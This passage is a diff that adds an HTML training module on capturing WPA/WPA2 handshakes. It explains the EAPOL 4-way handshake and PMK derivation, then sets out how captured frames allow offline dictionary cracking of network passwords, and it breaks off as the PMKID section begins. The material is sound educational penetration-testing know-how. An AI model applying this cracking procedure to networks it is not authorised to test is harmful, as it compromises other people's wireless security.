@@ -1,0 +1,1849 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!-- Access Control -->
+    <script src="../../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('dark-arts');</script>
+    <!-- Progress & Achievements -->
+    <script src="../../../../../components/AchievementManager.js"></script>
+    <script src="../../../../../components/ModuleProgress.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WiFi Arsenal Module 03: WPA/WPA2 Handshake Capture - The Vault</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            min-height: 100vh;
+            background: #0a0508;
+            font-family: 'Georgia', 'Times New Roman', serif;
+            color: #8a6a9a;
+            line-height: 1.7;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background:
+                radial-gradient(ellipse at 15% 40%, rgba(80, 40, 100, 0.08) 0%, transparent 50%),
+                radial-gradient(ellipse at 85% 60%, rgba(60, 20, 80, 0.06) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .scroll-progress {
+            position: fixed; top: 0; left: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #9333ea, #a855f7);
+            z-index: 200; transition: width 0.1s linear; width: 0%;
+        }
+
+        .module-header {
+            background: rgba(10, 5, 15, 0.95);
+            border-bottom: 1px solid rgba(100, 60, 130, 0.2);
+            padding: 18px 40px;
+            display: flex; justify-content: space-between; align-items: center;
+            position: sticky; top: 0; z-index: 100;
+            backdrop-filter: blur(10px);
+        }
+
+        .header-left { display: flex; align-items: center; gap: 15px; }
+
+        .back-btn {
+            background: rgba(80, 40, 100, 0.2);
+            border: 1px solid rgba(100, 60, 130, 0.3);
+            color: #9a7aaa; padding: 7px 14px; border-radius: 4px;
+            font-size: 0.8rem; text-decoration: none;
+            transition: all 0.3s ease; font-family: 'Georgia', serif;
+        }
+
+        .back-btn:hover {
+            background: rgba(100, 60, 130, 0.3);
+            border-color: rgba(147, 51, 234, 0.5); color: #c4a0d8;
+        }
+
+        .module-label { font-size: 0.75rem; color: #6a4a7a; letter-spacing: 0.2em; text-transform: uppercase; }
+
+        .header-right { display: flex; align-items: center; gap: 12px; font-size: 0.75rem; color: #6a4a7a; }
+
+        .progress-bar-mini {
+            width: 120px; height: 4px;
+            background: rgba(60, 30, 80, 0.3); border-radius: 2px; overflow: hidden;
+        }
+
+        .progress-bar-mini .fill {
+            height: 100%; background: linear-gradient(90deg, #9333ea, #a855f7);
+            width: 0%; transition: width 0.5s ease;
+        }
+
+        .module-content {
+            max-width: 1100px; margin: 0 auto; padding: 40px;
+            position: relative; z-index: 10;
+        }
+
+        .intro-section { text-align: center; padding: 50px 0 60px; }
+
+        .intro-icon {
+            font-size: 3.5rem; margin-bottom: 20px;
+            filter: drop-shadow(0 0 20px rgba(147, 51, 234, 0.3));
+        }
+
+        .intro-title { font-size: 2.4rem; color: #c4a0d8; margin-bottom: 12px; font-weight: 400; letter-spacing: 0.05em; }
+        .intro-meta { font-size: 0.75rem; color: #6a4a7a; letter-spacing: 0.25em; text-transform: uppercase; margin-bottom: 20px; }
+        .intro-subtitle { font-size: 1rem; color: #8a6a9a; max-width: 720px; margin: 0 auto; line-height: 1.8; }
+
+        .module-stats { display: flex; justify-content: center; gap: 25px; margin-top: 30px; flex-wrap: wrap; }
+
+        .stat-pill {
+            padding: 8px 18px;
+            background: rgba(60, 30, 80, 0.15);
+            border: 1px solid rgba(100, 60, 130, 0.2);
+            border-radius: 20px; font-size: 0.75rem; color: #7a5a8a; letter-spacing: 0.1em;
+        }
+
+        .section {
+            margin-bottom: 80px; opacity: 0; transform: translateY(30px);
+            transition: opacity 0.6s ease, transform 0.6s ease;
+        }
+
+        .section.visible { opacity: 1; transform: translateY(0); }
+
+        .section-number { font-size: 0.65rem; color: #6a4a7a; letter-spacing: 0.35em; text-transform: uppercase; margin-bottom: 8px; }
+
+        .section-title {
+            font-size: 1.9rem; color: #c4a0d8; margin-bottom: 20px; font-weight: 400;
+            display: flex; align-items: center; gap: 15px;
+            border-bottom: 1px solid rgba(100, 60, 130, 0.15); padding-bottom: 15px;
+        }
+
+        .section-icon { font-size: 1.6rem; opacity: 0.75; }
+
+        .section-body { color: #a080b0; font-size: 0.97rem; }
+        .section-body p { margin-bottom: 16px; }
+        .section-body ul { list-style: none; padding-left: 20px; margin-bottom: 16px; }
+        .section-body li { margin-bottom: 10px; position: relative; padding-left: 20px; }
+        .section-body li::before { content: '▸'; position: absolute; left: 0; color: #7a5a8a; }
+
+        /* Standards table */
+        .standards-table {
+            width: 100%; border-collapse: collapse; margin: 24px 0; font-size: 0.87rem;
+        }
+
+        .standards-table th {
+            background: rgba(40, 20, 60, 0.5); color: #c4a0d8; padding: 12px 16px;
+            text-align: left; font-weight: normal; letter-spacing: 0.1em;
+            font-size: 0.78rem; text-transform: uppercase;
+            border-bottom: 1px solid rgba(100, 60, 130, 0.2);
+        }
+
+        .standards-table td {
+            padding: 12px 16px; color: #9a7aaa;
+            border-bottom: 1px solid rgba(100, 60, 130, 0.08); vertical-align: top;
+        }
+
+        .standards-table tr:hover td { background: rgba(40, 20, 60, 0.2); }
+        .standards-table .std-name { color: #c4a0d8; font-family: 'Courier New', monospace; font-size: 0.9rem; }
+
+        .badge {
+            display: inline-block; padding: 2px 8px; border-radius: 10px;
+            font-size: 0.65rem; letter-spacing: 0.08em; text-transform: uppercase;
+        }
+
+        .badge-legacy { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
+        .badge-weak { background: rgba(234, 179, 8, 0.15); color: #facc15; border: 1px solid rgba(234, 179, 8, 0.3); }
+        .badge-current { background: rgba(34, 197, 94, 0.15); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.3); }
+        .badge-latest { background: rgba(147, 51, 234, 0.2); color: #c084fc; border: 1px solid rgba(147, 51, 234, 0.3); }
+
+        .concept-grid {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 18px; margin: 28px 0;
+        }
+
+        .concept-card {
+            background: rgba(15, 8, 20, 0.6);
+            border: 1px solid rgba(100, 60, 130, 0.15);
+            border-radius: 8px; padding: 22px; transition: all 0.3s ease;
+        }
+
+        .concept-card:hover {
+            transform: translateY(-4px); border-color: rgba(147, 51, 234, 0.35);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+        }
+
+        .concept-card-icon { font-size: 1.8rem; margin-bottom: 12px; }
+        .concept-card-title { font-size: 1rem; color: #c4a0d8; margin-bottom: 8px; }
+        .concept-card-body { font-size: 0.85rem; color: #8a6a9a; line-height: 1.6; }
+
+        .concept-tag {
+            display: inline-block; margin-top: 10px; padding: 3px 10px;
+            background: rgba(80, 40, 100, 0.3); border-radius: 12px;
+            font-size: 0.65rem; color: #9333ea; letter-spacing: 0.1em; text-transform: uppercase;
+        }
+
+        .callout {
+            border-radius: 8px; padding: 20px 24px; margin: 24px 0;
+            display: flex; gap: 16px; align-items: flex-start;
+        }
+
+        .callout-info { background: rgba(40, 20, 60, 0.4); border-left: 3px solid #9333ea; }
+        .callout-warning { background: rgba(60, 40, 10, 0.4); border-left: 3px solid #ca8a04; }
+        .callout-danger { background: rgba(60, 20, 20, 0.4); border-left: 3px solid #dc2626; }
+        .callout-tip { background: rgba(20, 50, 30, 0.4); border-left: 3px solid #16a34a; }
+
+        .callout-icon { font-size: 1.3rem; flex-shrink: 0; margin-top: 1px; }
+        .callout-title { font-size: 0.8rem; letter-spacing: 0.15em; text-transform: uppercase; margin-bottom: 6px; }
+        .callout-info .callout-title { color: #a855f7; }
+        .callout-warning .callout-title { color: #eab308; }
+        .callout-danger .callout-title { color: #ef4444; }
+        .callout-tip .callout-title { color: #22c55e; }
+        .callout-text { font-size: 0.9rem; color: #9a7aaa; line-height: 1.65; }
+
+        .detail-section {
+            border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px;
+            margin: 12px 0; overflow: hidden;
+        }
+
+        .detail-header {
+            padding: 16px 20px; background: rgba(15, 8, 20, 0.6);
+            cursor: pointer; display: flex; justify-content: space-between; align-items: center;
+            transition: background 0.3s ease; user-select: none;
+        }
+
+        .detail-header:hover { background: rgba(40, 20, 60, 0.5); }
+
+        .detail-header-left { display: flex; align-items: center; gap: 12px; }
+        .detail-header-icon { font-size: 1rem; opacity: 0.75; }
+        .detail-header-title { font-size: 0.95rem; color: #c4a0d8; }
+        .detail-header-subtitle { font-size: 0.75rem; color: #6a4a7a; margin-top: 2px; }
+        .detail-toggle { color: #7a5a8a; font-size: 0.8rem; transition: transform 0.3s ease; }
+        .detail-toggle.open { transform: rotate(180deg); }
+
+        .detail-body {
+            display: none; padding: 20px 24px; background: rgba(10, 5, 15, 0.4);
+            border-top: 1px solid rgba(100, 60, 130, 0.1);
+            color: #9a7aaa; font-size: 0.9rem; line-height: 1.7;
+        }
+
+        .detail-body.open { display: block; }
+        .detail-body p { margin-bottom: 12px; }
+        .detail-body ul { list-style: none; padding-left: 20px; }
+        .detail-body li { margin-bottom: 8px; position: relative; padding-left: 18px; }
+        .detail-body li::before { content: '▸'; position: absolute; left: 0; color: #7a5a8a; }
+
+        /* Tool cards */
+        .tool-grid {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 16px; margin: 20px 0;
+        }
+
+        .tool-card {
+            background: rgba(15, 8, 20, 0.6);
+            border: 1px solid rgba(100, 60, 130, 0.15);
+            border-radius: 8px; padding: 20px; transition: all 0.3s ease;
+        }
+
+        .tool-card:hover { border-color: rgba(147, 51, 234, 0.3); }
+
+        .tool-name {
+            font-size: 0.95rem; color: #c4a0d8; margin-bottom: 4px;
+            font-family: 'Courier New', monospace;
+        }
+
+        .tool-role {
+            font-size: 0.68rem; color: #9333ea; letter-spacing: 0.12em;
+            text-transform: uppercase; margin-bottom: 10px;
+        }
+
+        .tool-desc { font-size: 0.84rem; color: #8a6a9a; line-height: 1.6; }
+
+        .code-block {
+            background: rgba(5, 2, 10, 0.8);
+            border: 1px solid rgba(100, 60, 130, 0.2);
+            border-radius: 6px; padding: 16px 20px; margin: 16px 0;
+            font-family: 'Courier New', monospace; font-size: 0.84rem;
+            color: #b090c0; overflow-x: auto; line-height: 1.6;
+        }
+
+        .code-block .kw { color: #a855f7; }
+        .code-block .str { color: #86efac; }
+        .code-block .comment { color: #6a4a7a; font-style: italic; }
+        .code-block .flag { color: #fbbf24; }
+
+        .two-col {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0;
+        }
+
+        .col-card {
+            background: rgba(15, 8, 20, 0.6);
+            border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 22px;
+        }
+
+        .col-card h3 {
+            font-size: 1rem; color: #c4a0d8; margin-bottom: 12px;
+            display: flex; align-items: center; gap: 8px;
+        }
+
+        .col-card ul { list-style: none; padding: 0; }
+        .col-card li {
+            font-size: 0.88rem; color: #8a6a9a; padding: 6px 0;
+            border-bottom: 1px solid rgba(100, 60, 130, 0.08);
+            display: flex; align-items: flex-start; gap: 8px;
+        }
+        .col-card li:last-child { border-bottom: none; }
+        .li-marker { color: #9333ea; flex-shrink: 0; }
+
+        /* Attack flow diagram */
+        .flow-diagram {
+            background: rgba(5, 2, 10, 0.7);
+            border: 1px solid rgba(100, 60, 130, 0.2);
+            border-radius: 10px; padding: 30px; margin: 28px 0;
+        }
+
+        .flow-title {
+            font-size: 0.7rem; color: #6a4a7a; letter-spacing: 0.3em;
+            text-transform: uppercase; margin-bottom: 24px; text-align: center;
+        }
+
+        .flow-steps {
+            display: flex; align-items: flex-start; justify-content: space-between;
+            gap: 8px; flex-wrap: wrap;
+        }
+
+        .flow-step {
+            flex: 1; min-width: 140px; text-align: center;
+            display: flex; flex-direction: column; align-items: center; gap: 10px;
+        }
+
+        .flow-step-num {
+            width: 36px; height: 36px; border-radius: 50%;
+            background: rgba(80, 40, 100, 0.3); border: 1px solid rgba(147, 51, 234, 0.4);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 0.75rem; color: #a855f7; font-family: 'Courier New', monospace;
+            flex-shrink: 0;
+        }
+
+        .flow-step-label {
+            font-size: 0.78rem; color: #c4a0d8; line-height: 1.4; text-align: center;
+        }
+
+        .flow-step-detail {
+            font-size: 0.7rem; color: #6a4a7a; line-height: 1.4; text-align: center;
+        }
+
+        .flow-arrow {
+            color: #4a2a6a; font-size: 1.2rem; padding-top: 8px; flex-shrink: 0;
+            align-self: flex-start; margin-top: 8px;
+        }
+
+        /* EAPOL message sequence */
+        .eapol-sequence {
+            background: rgba(5, 2, 10, 0.7);
+            border: 1px solid rgba(100, 60, 130, 0.2);
+            border-radius: 10px; padding: 24px; margin: 24px 0;
+        }
+
+        .eapol-title {
+            font-size: 0.7rem; color: #6a4a7a; letter-spacing: 0.3em;
+            text-transform: uppercase; margin-bottom: 20px;
+        }
+
+        .eapol-row {
+            display: flex; align-items: center; gap: 0; margin-bottom: 8px;
+        }
+
+        .eapol-actor {
+            width: 100px; font-size: 0.75rem; color: #7a5a8a; text-align: center; flex-shrink: 0;
+        }
+
+        .eapol-actor.ap { color: #a855f7; }
+        .eapol-actor.client { color: #86efac; }
+
+        .eapol-msg-line {
+            flex: 1; position: relative; display: flex; align-items: center; padding: 6px 0;
+        }
+
+        .eapol-msg-bar {
+            height: 2px; width: 100%;
+            background: linear-gradient(90deg, rgba(100, 60, 130, 0.4), rgba(147, 51, 234, 0.4));
+        }
+
+        .eapol-msg-label {
+            position: absolute; top: -14px; left: 50%;
+            transform: translateX(-50%); white-space: nowrap;
+            font-size: 0.72rem; color: #9333ea; font-family: 'Courier New', monospace;
+            background: rgba(5, 2, 10, 0.9); padding: 2px 8px; border-radius: 4px;
+        }
+
+        .eapol-msg-arrow-right::after {
+            content: '▶'; position: absolute; right: -6px; top: 50%;
+            transform: translateY(-50%); color: #a855f7; font-size: 0.6rem;
+        }
+
+        .eapol-msg-arrow-left::before {
+            content: '◀'; position: absolute; left: -6px; top: 50%;
+            transform: translateY(-50%); color: #86efac; font-size: 0.6rem;
+        }
+
+        .eapol-divider {
+            display: flex; align-items: center; gap: 12px; margin: 16px 0 8px;
+        }
+
+        .eapol-divider-line { flex: 1; height: 1px; background: rgba(100, 60, 130, 0.1); }
+        .eapol-divider-label { font-size: 0.65rem; color: #6a4a7a; letter-spacing: 0.2em; white-space: nowrap; }
+
+        /* PMKID highlight card */
+        .highlight-card {
+            background: linear-gradient(135deg, rgba(80, 40, 100, 0.15), rgba(40, 20, 60, 0.25));
+            border: 1px solid rgba(147, 51, 234, 0.25); border-radius: 10px;
+            padding: 26px; margin: 24px 0;
+        }
+
+        .highlight-card-title {
+            font-size: 1rem; color: #c4a0d8; margin-bottom: 10px;
+            display: flex; align-items: center; gap: 10px;
+        }
+
+        .highlight-card-body { font-size: 0.9rem; color: #9a7aaa; line-height: 1.7; }
+        .highlight-card-body p { margin-bottom: 10px; }
+
+        /* Comparison table within detail body */
+        .mini-table {
+            width: 100%; border-collapse: collapse; margin: 12px 0; font-size: 0.83rem;
+        }
+
+        .mini-table th {
+            background: rgba(40, 20, 60, 0.4); color: #c4a0d8; padding: 8px 12px;
+            text-align: left; font-weight: normal; font-size: 0.72rem; letter-spacing: 0.1em;
+            text-transform: uppercase; border-bottom: 1px solid rgba(100, 60, 130, 0.2);
+        }
+
+        .mini-table td {
+            padding: 8px 12px; color: #9a7aaa;
+            border-bottom: 1px solid rgba(100, 60, 130, 0.06); vertical-align: top;
+        }
+
+        .mini-table tr:hover td { background: rgba(40, 20, 60, 0.2); }
+
+        /* TMux layout visualization */
+        .tmux-layout {
+            background: rgba(3, 1, 7, 0.9);
+            border: 1px solid rgba(100, 60, 130, 0.25); border-radius: 8px; overflow: hidden;
+            margin: 20px 0;
+        }
+
+        .tmux-bar {
+            background: rgba(40, 20, 60, 0.6); padding: 6px 14px;
+            font-family: 'Courier New', monospace; font-size: 0.72rem;
+            color: #6a4a7a; border-bottom: 1px solid rgba(100, 60, 130, 0.15);
+            display: flex; gap: 16px;
+        }
+
+        .tmux-tab { color: #c4a0d8; }
+        .tmux-tab.active { color: #a855f7; border-bottom: 2px solid #a855f7; }
+
+        .tmux-panes {
+            display: grid; grid-template-columns: 1fr 1fr; min-height: 180px;
+        }
+
+        .tmux-pane {
+            padding: 14px 16px; font-family: 'Courier New', monospace; font-size: 0.76rem;
+            color: #9a7aaa; line-height: 1.6; position: relative;
+        }
+
+        .tmux-pane + .tmux-pane { border-left: 1px solid rgba(100, 60, 130, 0.2); }
+
+        .tmux-pane-label {
+            font-size: 0.6rem; color: #4a2a6a; letter-spacing: 0.2em;
+            text-transform: uppercase; margin-bottom: 8px;
+        }
+
+        .tmux-pane .kw { color: #a855f7; }
+        .tmux-pane .str { color: #86efac; }
+        .tmux-pane .comment { color: #4a2a6a; font-style: italic; }
+        .tmux-pane .flag { color: #fbbf24; }
+        .tmux-pane .success { color: #4ade80; }
+        .tmux-pane .warn { color: #facc15; }
+
+        .discussion-section {
+            background: linear-gradient(135deg, rgba(40, 20, 60, 0.3), rgba(30, 15, 50, 0.4));
+            border: 1px solid rgba(100, 60, 130, 0.25); border-radius: 10px; padding: 30px; margin: 40px 0;
+        }
+
+        .discussion-title {
+            font-size: 1.1rem; color: #c4a0d8; margin-bottom: 20px;
+            display: flex; align-items: center; gap: 10px;
+        }
+
+        .prompt-list { list-style: none; padding: 0; }
+
+        .prompt-item {
+            padding: 14px 18px; background: rgba(15, 8, 20, 0.5);
+            border: 1px solid rgba(100, 60, 130, 0.12); border-radius: 6px;
+            margin-bottom: 10px; font-size: 0.9rem; color: #9a7aaa;
+            line-height: 1.6; display: flex; gap: 12px;
+        }
+
+        .prompt-num {
+            color: #9333ea; font-size: 0.8rem;
+            font-family: 'Courier New', monospace; flex-shrink: 0; padding-top: 2px;
+        }
+
+        .takeaway-grid {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 16px; margin: 24px 0;
+        }
+
+        .takeaway-card {
+            background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15);
+            border-radius: 8px; padding: 20px; text-align: center;
+        }
+
+        .takeaway-icon { font-size: 2rem; margin-bottom: 10px; }
+        .takeaway-title { font-size: 0.85rem; color: #c4a0d8; margin-bottom: 6px; }
+        .takeaway-desc { font-size: 0.78rem; color: #7a5a8a; line-height: 1.5; }
+
+        .completion-section {
+            text-align: center; padding: 60px 40px;
+            background: linear-gradient(135deg, rgba(40, 20, 60, 0.3), rgba(30, 15, 50, 0.4));
+            border: 1px solid rgba(100, 60, 130, 0.3); border-radius: 12px; margin: 60px 0 40px;
+        }
+
+        .completion-icon { font-size: 3.5rem; margin-bottom: 20px; }
+        .completion-title { font-size: 1.8rem; color: #c4a0d8; margin-bottom: 12px; font-weight: 400; }
+        .completion-text { color: #8a6a9a; font-size: 0.95rem; max-width: 560px; margin: 0 auto 30px; line-height: 1.8; }
+
+        .completion-btn {
+            display: inline-flex; align-items: center; gap: 10px; padding: 14px 36px;
+            background: linear-gradient(135deg, #7c3aed, #9333ea); border: none; border-radius: 8px;
+            color: #f3e8ff; font-size: 1rem; cursor: pointer; font-family: 'Georgia', serif;
+            letter-spacing: 0.05em; transition: all 0.3s ease; box-shadow: 0 4px 20px rgba(147, 51, 234, 0.3);
+        }
+
+        .completion-btn:hover {
+            background: linear-gradient(135deg, #6d28d9, #7c3aed);
+            box-shadow: 0 6px 30px rgba(147, 51, 234, 0.45); transform: translateY(-2px);
+        }
+
+        @media (max-width: 768px) {
+            .module-header { padding: 15px 20px; }
+            .module-content { padding: 20px; }
+            .two-col { grid-template-columns: 1fr; }
+            .tmux-panes { grid-template-columns: 1fr; }
+            .flow-steps { flex-direction: column; align-items: center; }
+            .flow-arrow { transform: rotate(90deg); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="scroll-progress" id="scrollProgress"></div>
+
+<header class="module-header">
+    <div class="header-left">
+        <a href="../index.html" class="back-btn">&#8592; Back to Course</a>
+        <div>
+            <div class="module-label">WiFi Arsenal &middot; Module 03</div>
+        </div>
+    </div>
+    <div class="header-right">
+        <span>Reading Progress</span>
+        <div class="progress-bar-mini">
+            <div class="fill" id="readingFill"></div>
+        </div>
+    </div>
+</header>
+
+<main class="module-content">
+
+    <!-- Hero -->
+    <div class="intro-section">
+        <div class="intro-icon">&#128274;</div>
+        <h1 class="intro-title">WPA/WPA2 Handshake Capture</h1>
+        <div class="intro-meta">WiFi Arsenal &bull; Module 03 &bull; Handshake Capture</div>
+        <p class="intro-subtitle">
+            The 4-way handshake is the authentication ceremony between a WPA/WPA2 client and access point.
+            Capturing this exchange — either passively during a live association or by forcing reconnection
+            through deauthentication — yields a cryptographic artifact that enables offline dictionary
+            attacks against the network password with no further access required. Understanding this
+            mechanism is foundational to both wireless penetration testing and defensive configuration decisions.
+        </p>
+        <div class="module-stats">
+            <div class="stat-pill">4-Way Handshake</div>
+            <div class="stat-pill">EAPOL Protocol</div>
+            <div class="stat-pill">PMKID Attack</div>
+            <div class="stat-pill">Deauthentication</div>
+            <div class="stat-pill">~25 min read</div>
+        </div>
+    </div>
+
+    <!-- Section 1: The 4-Way Handshake -->
+    <div class="section" id="s1">
+        <div class="section-number">Section 01</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128221;</span>
+            The 4-Way Handshake
+        </h2>
+        <div class="section-body">
+            <p>
+                When a client device associates with a WPA or WPA2 access point, the two parties perform a
+                cryptographic key negotiation called the 4-way handshake. This exchange is governed by the
+                EAPOL (Extensible Authentication Protocol over LAN) protocol and produces the session keys
+                used to encrypt all subsequent traffic. The critical security property — and the fundamental
+                vulnerability — is that the handshake can be validated offline if it is captured.
+            </p>
+            <p>
+                The handshake begins with a shared secret: the Pre-Shared Key (PSK), which is the network
+                password the user typed when configuring their device. From the PSK, both parties derive the
+                Pairwise Master Key (PMK) using PBKDF2-SHA1 with 4096 iterations, using the SSID as a salt.
+                This derivation is intentionally computationally expensive to slow brute-force attacks —
+                but it is not expensive enough to stop GPU-accelerated cracking on modern hardware.
+            </p>
+
+            <div class="callout callout-info">
+                <span class="callout-icon">&#8505;</span>
+                <div class="callout-content">
+                    <div class="callout-title">PMK Derivation Formula</div>
+                    <div class="callout-text">
+                        PMK = PBKDF2(HMAC-SHA1, PSK, SSID, 4096 iterations, 256 bits output)<br><br>
+                        The SSID acts as a per-network salt, meaning that precomputed rainbow tables cannot
+                        be shared across networks with different SSIDs. However, if the SSID is a common
+                        value (e.g., "linksys", "netgear", "home"), precomputed tables exist. The PSK is
+                        the only secret — if it appears in a dictionary wordlist, the PMK can be derived
+                        and the handshake verified offline.
+                    </div>
+                </div>
+            </div>
+
+            <p>
+                The four messages of the EAPOL exchange perform mutual proof that both parties hold the same
+                PMK, negotiate fresh session keys (the Pairwise Transient Key, or PTK), and install those
+                keys for use. No actual key material is transmitted — both sides independently derive the
+                PTK from the PMK and the nonces they exchange, and prove knowledge via a Message Integrity
+                Code (MIC).
+            </p>
+
+            <!-- EAPOL message sequence visualization -->
+            <div class="eapol-sequence">
+                <div class="eapol-title">EAPOL 4-Way Handshake Message Sequence</div>
+                <div style="display: flex; gap: 30px; align-items: flex-start; flex-wrap: wrap;">
+                    <div style="flex: 1; min-width: 280px;">
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 0.72rem;">
+                            <span style="color: #a855f7; font-family: 'Courier New', monospace;">Access Point (Authenticator)</span>
+                            <span style="color: #86efac; font-family: 'Courier New', monospace;">Client (Supplicant)</span>
+                        </div>
+                        <div style="background: rgba(40,20,60,0.2); border-radius: 6px; padding: 16px; font-family: 'Courier New', monospace; font-size: 0.78rem; line-height: 2;">
+                            <div style="color: #a855f7;">AP &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;——— ANonce ———&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Client</div>
+                            <div style="color: #86efac; text-align: right;">AP &nbsp;&nbsp;&nbsp;&lt;——— SNonce+MIC ———&nbsp;&nbsp; Client</div>
+                            <div style="color: #a855f7;">AP &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;——— GTK+MIC ————&gt;&nbsp;&nbsp;&nbsp;&nbsp; Client</div>
+                            <div style="color: #86efac; text-align: right;">AP &nbsp;&nbsp;&nbsp;&lt;——— ACK ——————&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Client</div>
+                        </div>
+                    </div>
+                    <div style="flex: 1; min-width: 220px;">
+                        <div style="font-size: 0.7rem; color: #6a4a7a; letter-spacing: 0.2em; text-transform: uppercase; margin-bottom: 12px;">Key Material Generated</div>
+                        <div style="font-size: 0.8rem; color: #9a7aaa; line-height: 1.8;">
+                            <div><span style="color: #c4a0d8;">ANonce:</span> AP random nonce</div>
+                            <div><span style="color: #c4a0d8;">SNonce:</span> Client random nonce</div>
+                            <div><span style="color: #c4a0d8;">PTK:</span> PRF(PMK, ANonce, SNonce, MACs)</div>
+                            <div><span style="color: #c4a0d8;">MIC:</span> HMAC over handshake data</div>
+                            <div><span style="color: #c4a0d8;">GTK:</span> Group Temporal Key (broadcast)</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128270;</span>
+                        <div>
+                            <div class="detail-header-title">Message 1: ANonce Delivery</div>
+                            <div class="detail-header-subtitle">AP generates and sends its random nonce to the client</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>
+                        The AP generates a fresh 256-bit random value called the ANonce (Authenticator Nonce)
+                        and transmits it to the client in the first EAPOL frame. This nonce is generated fresh
+                        for each authentication session and provides freshness — preventing replay attacks where
+                        an attacker reuses a captured handshake.
+                    </p>
+                    <p>
+                        At this point the client has everything it needs to begin PTK derivation:
+                        the PMK (computed from PSK+SSID), the ANonce (just received), its own MAC address,
+                        and the AP's MAC address. The client generates its own SNonce and computes the PTK
+                        before sending message 2.
+                    </p>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128270;</span>
+                        <div>
+                            <div class="detail-header-title">Message 2: SNonce + MIC (The Crackable Frame)</div>
+                            <div class="detail-header-subtitle">Client proves PMK knowledge via MIC — the frame attackers target</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>
+                        The client sends its SNonce (Supplicant Nonce) back to the AP, along with a Message
+                        Integrity Code (MIC) computed over the entire EAPOL frame using the PTK's KCK
+                        (Key Confirmation Key) component as the HMAC key.
+                    </p>
+                    <p>
+                        This is the frame that makes offline cracking possible. An attacker who captures
+                        messages 1 and 2 has all the inputs needed to brute-force the PSK:
+                    </p>
+                    <ul>
+                        <li>ANonce (from message 1)</li>
+                        <li>SNonce (from message 2)</li>
+                        <li>AP MAC address (BSSID, from beacon frames)</li>
+                        <li>Client MAC address (from the frame headers)</li>
+                        <li>The MIC (from message 2) — the verification target</li>
+                    </ul>
+                    <p>
+                        For each candidate password from a wordlist: derive PMK (PBKDF2), derive PTK
+                        (PRF-512), derive KCK (first 128 bits of PTK), compute HMAC-MD5 or HMAC-SHA1 over
+                        the EAPOL frame, compare against the captured MIC. Match = password found.
+                    </p>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128270;</span>
+                        <div>
+                            <div class="detail-header-title">Messages 3 &amp; 4: GTK Installation and ACK</div>
+                            <div class="detail-header-subtitle">Group key distribution and final handshake confirmation</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>
+                        The AP now computes the same PTK (it has both nonces and the shared PMK) and verifies
+                        the MIC from message 2. Successful verification proves the client knows the PMK.
+                        Message 3 transmits the Group Temporal Key (GTK) — the broadcast encryption key —
+                        encrypted with the PTK, and includes another MIC for the AP to prove its own PMK
+                        knowledge to the client.
+                    </p>
+                    <p>
+                        Message 4 is a simple acknowledgment from the client. After message 4, both parties
+                        install the PTK and GTK, and encrypted data transmission begins. The handshake is
+                        complete.
+                    </p>
+                    <p>
+                        For cracking purposes, capturing any two consecutive messages that include a MIC
+                        (messages 2 and 3 together are the most useful; messages 1+2 are sufficient) provides
+                        everything needed for an offline attack. Tools like aircrack-ng will indicate "WPA
+                        handshake" in the capture output when a usable EAPOL sequence is detected.
+                    </p>
+                </div>
+            </div>
+
+            <div class="callout callout-warning">
+                <span class="callout-icon">&#9888;</span>
+                <div class="callout-content">
+                    <div class="callout-title">Why This Enables Offline Attacks</div>
+                    <div class="callout-text">
+                        The design flaw is architectural: the only secret protecting WPA2-Personal is the
+                        PSK (password). The handshake verification mechanism requires that this secret can
+                        be used to compute the MIC, which means anyone with the captured EAPOL frames can
+                        independently verify guesses offline — with no rate limiting, no lockout, and no
+                        interaction with the target network. GPU cracking rates for WPA2 exceed 1 million
+                        candidates per second on consumer hardware. An 8-character lowercase alphabetic
+                        passphrase (26^8 = ~200 billion combinations) is recoverable in hours.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 2: PMKID Attack -->
+    <div class="section" id="s2">
+        <div class="section-number">Section 02</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#9889;</span>
+            PMKID Attack: Clientless Handshake Capture
+        </h2>
